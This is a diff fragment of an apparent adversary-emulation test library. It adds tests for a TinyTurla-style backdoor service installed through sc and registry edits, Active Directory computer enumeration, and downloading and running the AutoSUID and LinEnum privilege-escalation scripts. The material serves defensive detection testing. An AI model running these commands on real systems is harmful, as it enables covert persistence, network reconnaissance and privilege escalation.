       created: '2020-02-11T18:18:34.279Z'
@@ -50420,6 +51123,36 @@ persistence:
           Stop-Service -Name "#{service_name}" 2>&1 | Out-Null
           try {(Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()}
           catch {}
+    - name: TinyTurla backdoor service w64time
+      auto_generated_guid: ef0581fd-528e-4662-87bc-4c2affb86940
+      description: |
+        It's running Dll as service to emulate the tine turla backdoor
+
+        [Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)
+      supported_platforms:
+      - windows
+      input_arguments:
+        dllfilename:
+          description: It specifies Dll file to run as service
+          type: string
+          default: "$PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll"
+      executor:
+        command: |-
+          copy #{dllfilename} %systemroot%\system32\
+          sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto
+          sc config W64Time DisplayName= "Windows 64 Time"
+          sc description W64Time "Maintain date and time synch on all clients and services in the network"
+          reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
+          reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f
+          sc start W64Time
+        cleanup_command: |-
+          sc stop W64Time
+          sc.exe delete W64Time
+          del %systemroot%\system32\w64time.dll
+          reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /f
+          reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /f
+        name: command_prompt
+        elevation_required: true
   T1547.004:
     technique:
       created: '2020-01-24T16:59:59.688Z'
@@ -56387,6 +57120,34 @@ discovery:
 
 '
         name: sh
+    - name: Enumerate domain computers within Active Directory using DirectorySearcher
+      auto_generated_guid: 962a6017-1c09-45a6-880b-adc9c57cb22e
+      description: "This test is a Powershell script that enumerates Active Directory
+        to determine computers that are joined to the domain. \nThis test is designed
+        to mimic how SessionGopher can determine the additional systems within a domain,
+        which has been used before by threat actors to aid in lateral movement. \nReference:
+        [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks).
+        \nUpon successful execution, this test will output the names of the computers
+        that reside on the domain to the console window. \n"
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: This PC must be joined to a domain.
+        prereq_command: "if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain
+          -eq $true) {exit 0} else {exit 1}\t\t"
+        get_prereq_command: 'write-host "This PC must be manually added to a domain." '
+      executor:
+        command: |
+          $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)")
+          $DirectorySearcher.PropertiesToLoad.Add("Name")
+          $Computers = $DirectorySearcher.findall()
+          foreach ($Computer in $Computers) {
+            $Computer = $Computer.Properties.name
+            if (!$Computer) { Continue }
+            Write-Host $Computer}
+        name: powershell
+        elevation_required: false
   T1518.001:
     technique:
       id: attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384
@@ -65273,6 +66034,73 @@ execution:
         cleanup_command: 'rm /tmp/art-fish.txt
 
 '
+        name: sh
+    - name: Harvest SUID executable files
+      auto_generated_guid: 46274fc6-08a7-4956-861b-24cbbaa0503c
+      description: "AutoSUID application is the Open-Source project, the main idea
+        of which is to automate harvesting the SUID executable files and to find a
+        way for further escalating the privileges. \n"
+      supported_platforms:
+      - linux
+      input_arguments:
+        autosuid:
+          description: Path to the autosuid shell script
+          type: Path
+          default: PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
+        autosuid_url:
+          description: Path to download autosuid shell script
+          type: Url
+          default: https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'AutoSUID must exist on disk at specified location (#{autosuid})
+
+'
+        prereq_command: 'if [ -f #{autosuid} ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: 'curl #{autosuid_url} --output #{autosuid}
+
+'
+      executor:
+        command: |
+          chmod +x #{autosuid}
+          bash #{autosuid}
+        name: sh
+    - name: LinEnum tool execution
+      auto_generated_guid: a2b35a63-9df1-4806-9a4d-5fe0500845f2
+      description: 'LinEnum is a bash script that performs discovery commands for
+        accounts,processes, kernel version, applications, services, and uses the information
+        from these commands to present operator with ways of escalating privileges
+        or further exploitation of targeted host.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        linenum:
+          description: Path to the LinEnum shell script
+          type: Path
+          default: PathToAtomicsFolder/T1059.004/src/LinEnum.sh
+        linenum_url:
+          description: Path to download LinEnum shell script
+          type: Url
+          default: https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'LinnEnum must exist on disk at specified location (#{linenum})
+
+'
+        prereq_command: 'if [ -f #{linenum} ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: 'curl #{linenum_url} --output #{linenum}
+
+'
+      executor:
+        command: |
+          chmod +x #{linenum}
+          bash #{linenum}
         name: sh
   T1204:
     technique:
